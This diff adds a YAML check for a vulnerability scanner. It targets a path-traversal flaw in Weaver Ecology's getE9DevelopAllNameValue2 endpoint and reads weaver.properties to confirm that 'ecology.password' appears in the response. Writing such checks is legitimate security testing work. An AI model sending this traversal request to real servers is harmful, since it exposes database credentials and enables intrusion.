@@ -1,0 +1,8 @@
+name: weaver-ecology-gete9developallnamevalue2-fileread
+rules:
+  - method: GET
+    path: "/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../weaver.properties"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'ecology.password')
+detail:
+  author: 666
